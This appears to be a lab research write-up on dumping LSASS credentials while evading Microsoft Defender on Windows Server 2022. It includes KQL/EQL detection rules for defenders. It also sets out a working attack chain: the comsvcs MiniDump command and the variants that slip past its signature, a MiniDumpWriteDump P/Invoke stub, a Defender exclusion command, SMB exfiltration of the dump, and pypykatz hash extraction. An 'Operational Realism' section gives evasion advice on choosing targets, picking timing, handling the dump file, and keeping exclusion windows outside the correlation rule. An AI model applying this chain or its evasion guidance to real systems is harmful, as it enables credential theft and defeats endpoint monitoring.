<img width="1867" height="963" alt="4RULESBTEST" src="https://github.com/user-attachments/assets/a4fd80d5-6232-4b28-9fc0-438d45416e67" />



# LSASS Credential Dump via Direct API Call: Defender Evasion and Detection Analysis

**Technique:** Direct `MiniDumpWriteDump` via compiled C# binary (dbghelp.dll)  
**Delivery:** SYSTEM-level reverse shell via scheduled task  
**Outcome:** Successful credential dump on both test builds. Administrator NT hash extracted.  
**Defender:** Does not learn from prior detections in a way that changes early-lifecycle detection behaviour  
**Date:** April 24-25, 2026

## Research Scope

This writeup focuses on detection engineering and Microsoft Defender telemetry behaviour, not tool development.

The technique is described at the API level using publicly documented Windows functionality. No tooling or compiled binaries are provided.

No vulnerability or security boundary bypass was identified. This research examines how Defender responds to specific credential access patterns and where visibility diverges from enforcement.

The goal is to clarify detection boundaries for defenders.

---

## Test Matrix

| Variable | Test A | Test B |
|---|---|---|
| Host | WIN-ATTACK | WIN-1KS84GNPAUM |
| OS Build | 20348.587 (21H2) | 20348.5020 (21H2) |
| Defender Version | 4.18.26030.3011 | 4.18.26030.3011 |
| Signature Version | 1.449.275.0 (age 0) | 1.449.293.0 (age 0) |
| AMRunningMode | Normal | Normal |
| PPL | Not enabled | Not enabled |
| Dump succeeded | ✅ | ✅ |
| Restart required | No (premature kill in earlier attempts) | No |
| Folder exclusion required | Yes (post-write survival) | No — dump survived without exclusion |
| No 1116/1117 on dump | ✅ | ✅ |
| EID 10 fired | ❌ | ❌ Runs 1-2 / ✅ Run 3 only — race condition confirmed |

**Key finding: OS patch level did not break the chain. Defender signature version did not break the chain.**

---

## Phase 1 — Baseline: comsvcs MiniDump via rundll32

### Technique
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\lsass.dmp full
```

### Result
**Blocked.** Defender fires at process creation. The `.dmp` file never lands.

### Defender Detection
- **Signature:** `HackTool:Win32/DumpLsass.H` (Threat ID: 2147786203)
- **Path field prefix:** `CmdLine:_` — command line signature match
- **Process Name:** Unknown — process killed before name was resolvable
- **Action:** Remove

### EID 1116/1117
Two EID 1116 events (parent + child rundll32), EID 1117 ~8-9 seconds later. Consistent across all caught attempts.

### Sysmon EID 10
Did not fire — process killed before handle open completed.

---

## Phase 2 — CmdLine Signature Shape Probing

| Attempt | Variation | Defender Response | Notes |
|---|---|---|---|
| 1 | Original comma syntax | Blocked — 1116/1117 | Baseline |
| 2 | No comma after DLL | Blocked — 1116/1117 | Spacing irrelevant |
| 3 | `minidump` lowercase | Blocked — 1116/1117 | Case-insensitive |
| 4 | PowerShell v2 wrapper | Blocked — 1116/1117 | Full parent chain matched |
| 5 | Output `report.txt` | Blocked — 1116/1117 | Extension irrelevant |
| 6 | Ordinal `#4` (wrong) | No 1116/1117 — hung | Wrong ordinal, silent fail |
| 7 | Ordinal `#24` (MiniDumpW) | No 1116/1117 — hung | Different enforcement path |
| 8 | `MiniDumpW` explicit | No 1116/1117 — silent | Different enforcement path |

### Observation

The `HackTool:Win32/DumpLsass.H` CmdLine signature is anchored on the token `MiniDump` — case-insensitive, wrapper-agnostic, extension-agnostic. `MiniDumpW` and ordinal `#24` did not trigger 1116/1117. This characterises the shape of this specific signature, not necessarily the full detection capability — Defender may handle those paths via different enforcement mechanisms that do not surface as threat classification events.

### Export Table (verified via pefile on Kali)
```
Ordinal  Export
...
24       MiniDumpW    ← actual exported symbol
...
```
`MiniDump` is not in the export table. It is an alias resolved internally by rundll32. The Defender signature covers the alias, not the canonical export name. This illustrates a broader detection design principle: **detection anchored to invocation artifacts rather than capability semantics is inherently bypassable.** Any technique that invokes the same underlying capability through a different surface — a different function name, a different calling convention, a different abstraction layer — escapes the signature entirely. This generalises well beyond LSASS dumping.

---

## Phase 3 — Direct API Call via Compiled C# Binary

### Technique

A compiled C# binary calling `MiniDumpWriteDump` from `dbghelp.dll` directly, bypassing comsvcs and rundll32 entirely. Standard Win32 P/Invoke — no shellcode, no reflective loading. Functionally equivalent to legitimate crash dump tooling.

```csharp
[DllImport("dbghelp.dll")]
public static extern bool MiniDumpWriteDump(
    IntPtr hProcess, uint processId, IntPtr hFile,
    uint dumpType, IntPtr exceptionParam,
    IntPtr userStreamParam, IntPtr callbackParam);
```

Compiled targeting .NET Framework 4.x x64. Executed from SYSTEM context via scheduled task reverse shell.

### Execution Behaviour (both builds)
- **No Defender CmdLine alert** — EID 1116/1117 did not fire
- **Output file created** — handle open succeeded
- **Write duration: approximately 30-45 minutes** — Defender's runtime enforcement layer significantly degrades write speed without blocking completion
- **System under stress during write** — display unresponsive, SMB unresponsive, ping alive throughout
- **Dump completed** — file landed, pypykatz parsed successfully

### Runtime Enforcement Observation

Something below the CmdLine signature layer actively interferes with the dump write, reducing throughput dramatically without preventing completion. The precise mechanism (memory scanning, kernel callback contention, minifilter interference) was not isolated in this lab run — isolating it is a natural next step. What is confirmed:

- It produces no standard audit events (no 1116/1117, no EID 10)
- It does not prevent dump completion
- It causes significant system stress during the write window
- The OS remains functional throughout (confirmed by clean shutdown sequences and ping responses)

The critical observation is not that Defender "missed" the dump — it is that Defender demonstrably observed the activity (evidenced by the runtime interference and throughput degradation) while emitting no corresponding security signal. That is a harder problem than a detection gap: the control touched it, slowed it, and said nothing.

On the third run on WIN-1KS84GNPAUM, Sysmon EID 10 (LSASS PROCESS_ALL_ACCESS) fired — twice — despite not firing on the two previous runs on the same host with identical configuration. This is the strongest possible evidence for the race condition framing: same binary, same host, same Defender state, different telemetry outcome across runs.

### Test A — Folder Exclusion Required (20348.587)

Defender post-write remediation deleted the dump file before exfiltration. A folder exclusion was added to preserve the file:

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

This generated EID 5007 and a Kibana alert.

### Test B — No Exclusion Required (20348.5020)

On the patched build (20348.5020, sigs 1.449.293.0), the dump file survived post-write without a folder exclusion. The exclusion was added after the dump completed, purely to protect the file during SMB exfiltration.

**Dump file survivability confirmed — post-session validation:**

After exfiltration, the exclusion was removed (`Remove-MpPreference`). The dump file (`out2.dmp`, 50,295 KB) remained in `C:\Windows\Temp`. The VM was then rebooted — triggering a Defender startup scan. The file survived the reboot and startup scan intact. `Get-MpThreatDetection` confirmed no detection event was ever generated against the dump file at any point — not during write, not at rest, not after exclusion removal, not after reboot.

The most recent threat detections on this host were against the hosts file (ThreatID 14994) and a log file from a prior session. The LSASS dump file never appeared in Defender's threat history.

**Interaction-triggered detection confirmed:**

Right-click → Properties on the dump file surfaced the content signature — **Trojan:Win32/LsassDump.A, Severe** — and the file was quarantined within 13 seconds. Explorer selection (visual highlight) did not trigger detection. SMB-based exfiltration did not trigger detection. The trigger is a specific scan-invocation path, not passive file presence or general file access.

**Defender did not learn from prior detections.** A third run on the same host — after Defender had already quarantined a previous dump via `Trojan:Win32/LsassDump.A` — produced another successful dump with no earlier detection. Prior quarantine of the same threat class on the same host did not prime Defender to detect the subsequent dump at any earlier lifecycle stage.

### Exfiltration
```bash
smbclient //192.168.1.84/C$ -U 'Administrator%<redacted>' \
  -c 'get Windows\Temp\out2.dmp /tmp/out2.dmp'
```

### Credential Extraction
```bash
pypykatz lsa minidump /tmp/out2.dmp
```

**Test A results (WIN-ATTACK, 20348.587):**
```
username : Administrator / WIN-ATTACK
NT hash  : 3cxxxxxxxxxxxxxxxxxxxxxxxx
DPAPI masterkey, Kerberos session extracted
Machine account NT hash + Kerberos plaintext password extracted
```

**Test B results (WIN-1KS84GNPAUM, 20348.5020) — three successful runs:**
```
username : Administrator / WIN-1KS84GNPAUM
NT hash  : 3cxxxxxxxxxxxxxxxxxxxxxxxx
DPAPI masterkeys (x3), Kerberos session extracted
Machine account NT hash + Kerberos plaintext password extracted
```

---

## PPL Status (both builds)

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL : not present
```

PPL not enabled on either host. Runtime interference is Defender-native, not OS-level process isolation.

---

## Defender Behaviour Model — Four Layers

This research maps four distinct layers of Defender behaviour across the LSASS dump lifecycle. Each layer has a different trigger, a different outcome, and a different telemetry profile:

| Layer | Trigger | Defender Behaviour | Telemetry |
|---|---|---|---|
| 1. Pre-execution CmdLine | rundll32 + comsvcs + MiniDump token | Detect + block, process killed | EID 1116/1117 |
| 2. Runtime enforcement | Direct API write to lsass memory | Interference — throughput degraded ~30-45x | None |
| 3. At-rest presence | File exists, reboot, startup scan, passive access | No detection | None |
| 4. Interaction-triggered inspection | Right-click → Properties (metadata + content scan path) | Detect + quarantine: Trojan:Win32/LsassDump.A | Defender notification |

**The core insight:** detection is not tied to the artifact or the behavior — it is tied to how the artifact is accessed. The same file, on the same system, with the same content, produces different outcomes depending on the interaction path. This is a more uncomfortable conclusion than a simple bypass: it means attacker-controlled interaction sequencing determines detection outcomes.

---

## Detection Telemetry — Full Session Summary

### Test A Alert Timeline (WIN-ATTACK, 20348.587)

| Time | Rule | Severity | Notes |
|---|---|---|---|
| 16:39 | Sysmon - Base64 Encoded Payload | High (70) | Shell delivery run 1 |
| 17:24 | Sysmon - Base64 Encoded Payload | High (70) | Shell delivery run 2 |
| 17:29 | Defender - Exclusion Path Added | High (73) | Pre-exfil exclusion |

**Zero alerts on the dump chain.**

### Test B Alert Timeline (WIN-1KS84GNPAUM, 20348.5020)

| Time | Rule | Severity | Notes |
|---|---|---|---|
| 21:53:12 | Defender - Exclusion Path Added | High (73) | Post-dump run 1, pre-exfil |
| 21:53:24 | Admin Share Access - C$ via SMB | High (73) | Run 1 exfil |
| 22:12:39 | Defender - Exclusion Path Removed | High (47) | Cleanup |
| 22:25:39 | Defender - Transient Exclusion Window Detected | Critical (99) | EQL sequence correlation |
| 23:03:27 | LSASS Access - PROCESS_ALL_ACCESS | Critical (99) | EID 10 fired — run 3 (x2) |
| 23:13:12 | Defender - Exclusion Path Added | High (73) | Run 3 pre-exfil |
| 00:03:24 | Admin Share Access - C$ via SMB | High (73) | Run 3 exfil |

**Zero alerts on the dump chain across all three runs on this host.** EID 10 fired on run 3 but not runs 1 or 2 — same host, same binary, same Defender state. Every other detection relates to the exclusion lifecycle or exfiltration.

### EID Telemetry Matrix

| Layer | EID | comsvcs/MiniDump | MiniDumpW/ordinal | Direct dbghelp |
|---|---|---|---|---|
| Defender CmdLine | 1116/1117 | ✅ Fires | ❌ No | ❌ No |
| Sysmon ProcessCreate | 1 | ✅ Fires | ✅ Fires | ✅ Fires |
| Sysmon ProcessAccess | 10 | ❌ Killed first | ❌ Hung | ⚠️ Non-deterministic — fired run 3, not runs 1-2 |
| Sysmon FileCreate | 11 | ❌ Never lands | ❌ No | ❌ No |
| Defender Config Change | 5007 | — | — | ✅ On exclusion add/remove |

---

## Detection Rules

### EID 1 — comsvcs baseline + MiniDumpW coverage (KQL)
```kql
event.code: "1" and
winlog.event_data.Image: "*rundll32.exe" and
winlog.event_data.CommandLine: (*comsvcs* and (*MiniDump* or *MiniDumpW*))
```

### EID 1 — Ordinal invocation coverage (KQL)
```kql
event.code: "1" and
winlog.event_data.Image: "*rundll32.exe" and
winlog.event_data.CommandLine: (*comsvcs* and *#*)
```

### EID 5007 — Exclusion path addition (KQL)
```kql
event.code: "5007" and "winlog.event_data.New Value": *Exclusions*
```

### Transient Exclusion Window — Highest value signal (EQL, Critical)
```eql
sequence by winlog.computer_name with maxspan=30m
  [any where event.code == "5007" and winlog.event_data.`New Value` != null]
  [any where event.code == "5007" and winlog.event_data.`Old Value` != null 
   and winlog.event_data.`New Value` == null]
```

Detects add→remove exclusion sequence within 30 minutes — the operational signature of a timed exclusion attack. No common administrative workflow adds and removes a Defender exclusion within this window — it is extremely rare outside scripted or adversarial activity. Correlate with EID 1 on comsvcs/rundll32 patterns for full chain confirmation.

---

## Findings

The data supports a three-part characterisation of Defender's behaviour across this attack chain:

> **Detection exists — but is path-dependent and interaction-triggered.**  
> **Enforcement exists — but is non-blocking.**  
> **Visibility exists — but gated behind specific scan-triggering interactions.**

Compressed: Defender recognizes the behavior, interferes with it, but only surfaces it when a specific inspection path is triggered.

---

1. **Successful credential dump achieved on both test builds** — 20348.587 and 20348.5020 — with current Defender signatures in Normal mode. Administrator NT hash, machine account credentials, and DPAPI master keys extracted on both. Three successful dumps on WIN-1KS84GNPAUM alone.

2. **OS patch level did not break the chain.** Defender signature version did not break the chain. The technique is build-agnostic under current Defender engine.

3. **The `HackTool:Win32/DumpLsass.H` CmdLine signature is the visible enforcement layer** — reliably triggered by the documented `MiniDump` alias, bypassed entirely by direct `MiniDumpWriteDump` via dbghelp.dll.

4. **Runtime enforcement exists below the CmdLine layer** — it significantly degrades dump write performance (~30-45 minutes) without preventing completion, and produces no standard audit events.

5. **Test B (20348.5020): dump file survivability is interaction-dependent.** The completed dump file survived exclusion removal, a full system reboot, and Defender's startup scan without triggering any detection or remediation. Explorer selection (visual highlight) also produced no alert. However, right-click → Properties triggered an on-access content read which surfaced the file signature — **Trojan:Win32/LsassDump.A, Severe** — and the file was quarantined at 13:06.

| Interaction | Defender Response |
|---|---|
| Post-write presence | No detection |
| Exclusion removal | No detection on file |
| Reboot / startup scan | No detection |
| Explorer selection | No detection |
| Right-click → Properties | **Detected — Trojan:Win32/LsassDump.A — Quarantined** |

SMB-based exfiltration (observed in this session) did not trigger the same inspection path that surfaces the file signature. The window between dump completion and content-read-triggered detection was operationally sufficient to complete exfiltration.

5a. **Four distinct Defender behaviours observed across the attack chain:**
   - comsvcs/MiniDump path → CmdLine signature fires, process killed, file never lands
   - Direct dbghelp write → no CmdLine alert, runtime interference degrades write, dump completes
   - Completed dump file at rest → not detected through reboot, startup scan, and passive interaction
   - File content read (right-click → Properties) → content signature fires, Trojan:Win32/LsassDump.A, quarantined

6. **Zero LSASS-specific alerts fired on any dump attempt** across all runs on both test hosts. Every detection was in the exclusion lifecycle or exfiltration path.

7. **EID 10 is non-deterministic under active Defender enforcement.** It fired on the third run on WIN-1KS84GNPAUM but not the first two — same host, same binary, same Defender state. This is not a detection gap — it is race-condition dependent emission. The same technique produced different telemetry across runs with no reliable predictor of which. The implication is worse than simple unreliability: the more protected the system, the less likely your telemetry fires cleanly. Detection rules built on EID 10 as the primary LSASS access signal are anti-reliable under protection — they degrade precisely in the environments where they matter most. When EID 10 does fire, it should be treated as a high-confidence signal. When it doesn't, absence of evidence is not evidence of absence.

8. **The Transient Exclusion Window EQL rule is the highest-value detection signal** — Critical severity, risk score 99, fires on the add→remove exclusion sequence. It survived lab validation on the B test session.

9. **Defender does not learn from prior detections.** A third run after prior quarantine of `Trojan:Win32/LsassDump.A` on the same host produced another successful dump with no earlier lifecycle detection. Prior threat history did not change detection behaviour.

10. **The realistic attack target is not a DC.** A 30-45 minute write with associated system stress is immediately visible on a domain controller. The extended execution time forces target selection — this is not a smash-and-grab primitive. It is a low-noise persistence-phase credential harvest: a member server, admin workstation, or jump host with a cached privileged session, in a quiet window, where sustained CPU and I/O load does not immediately trigger investigation. Same credential value, lower operational signature.

---

## Operational Realism

This section documents attack-chain constraints derived directly from lab findings — not generic OPSEC guidance, but behaviours that follow logically from the detection telemetry observed.

**Target selection is forced by write time.** A 30-45 minute write with elevated CPU and I/O is not invisible on an active system. A domain controller or heavily monitored server is the wrong target. The realistic target is an admin workstation, jump host, or member server — ideally one with a cached privileged session and no active user.

**Timing matters.** 02:00-04:00 local time on an idle machine with no active session. Sustained load on an idle machine draws far less attention than the same load during business hours. The write duration makes daytime execution operationally expensive.

**Session requirement.** A privileged credential must exist in LSASS. The higher the privilege of the cached session, the higher the credential value — but also the more likely the machine is actively monitored. Lateral movement to a less-monitored host that has recently been accessed by a domain admin is the realistic precondition.

**Interaction discipline.** Based on lab findings: do not right-click the dump file on the target host. Right-click → Properties invokes a scan-triggering inspection path that surfaces `Trojan:Win32/LsassDump.A`. SMB-based exfiltration directly from the machine did not trigger the same path. Touch the file as little as possible on the target.

**Exclusion decision.** The folder exclusion is not required for dump completion — on 20348.5020 the dump file survived post-write without one. It is required for exfiltration: SMB-based transfer needs the exclusion in place to prevent interception during the copy. The practical approach is to add the exclusion immediately before exfil and remove it immediately after, keeping the add→remove window as tight as possible. The tradeoff: a tight window generates EID 5007 events and risks triggering the Transient Exclusion Window correlation rule (Critical, 99) if the window falls within the rule's maxspan. Pre-staging the exclusion well before exfil widens that window — potentially outside the maxspan — but extends the exposure period. Neither option is clean. The EID 5007 signal is unavoidable regardless of timing.

---

## Next Steps

- **Runtime enforcement mechanism isolation** — determine whether the throughput degradation is memory scanning contention, minifilter throttling, or dump stream inspection. Naming the mechanism elevates this from gap analysis to partial reverse of Defender's runtime behaviour.
- **Test A survivability validation** — confirm whether completed dump file also survives at rest on 20348.587 without exclusion
- **Credential use validation** — pass-the-hash with extracted NT hash against DC01 (Done. Screenshot below)
- **GhostKatz / BYOVD path** — neutralise runtime enforcement to reduce dump time from ~45 minutes to seconds
- **Comspec + base64 PowerShell detection** — Vector 8

---
<img width="841" height="260" alt="dump" src="https://github.com/user-attachments/assets/d851f180-9958-49e9-a2a9-c59aef05f73d" />

<img width="933" height="550" alt="2026-04-24_18-08exfil" src="https://github.com/user-attachments/assets/99dc3100-007e-4e34-8b63-c23ff0442070" />

<img width="1782" height="938" alt="fulldumpbFULL" src="https://github.com/user-attachments/assets/1dc48f49-9e0d-4bd4-b796-41f9f90e8b38" />

<img width="1563" height="929" alt="fulldumpb" src="https://github.com/user-attachments/assets/fadd26c0-4abd-4b9c-8380-d40a618e77ed" />

<img width="1872" height="905" alt="transientrule" src="https://github.com/user-attachments/assets/d4768330-29ac-4449-959b-ff5e85f7f811" />

<img width="1866" height="921" alt="transientruleKQL" src="https://github.com/user-attachments/assets/ca85f9f2-1c72-43fe-b22f-76c5089bf160" />

EID 10 FIRING ON 3rd DUMP (3 miliseconds apart.... probably a double whammy on the same event)

<img width="1878" height="1055" alt="EID10FIRINGON3rdRUN" src="https://github.com/user-attachments/assets/8e227a34-7464-49b4-828c-9feacafa36e1" />

<img width="1541" height="924" alt="evilwinrm2" src="https://github.com/user-attachments/assets/20910bda-3205-41a3-80e6-43420290f0bf" />


DC:

<img width="1328" height="278" alt="evilwinrmDC" src="https://github.com/user-attachments/assets/5d4ba1c0-4a50-4e99-92df-d77d2bb5e2c7" />


DEFENDER DOESN'T LEARN: DUMPED FOR THE 3rd TIME: NOTE TIME ZONE... I AM SHOMER SHABBOSS...(really...)

<img width="1851" height="969" alt="doesntlearnSHABBATTIMERZONE" src="https://github.com/user-attachments/assets/96a233f8-7ecc-4e0a-a67c-d8e55da1bf8c" />

<img width="450" height="450" alt="image" src="https://github.com/user-attachments/assets/33fcf913-46db-4e96-9f5c-c5d0b0e59d09" />






*Lab-validated on fully patched Windows Server 2022 (20348.587 and 20348.5020) with current Defender signatures in Normal mode. A/B test confirmed technique is build-agnostic under current engine.*
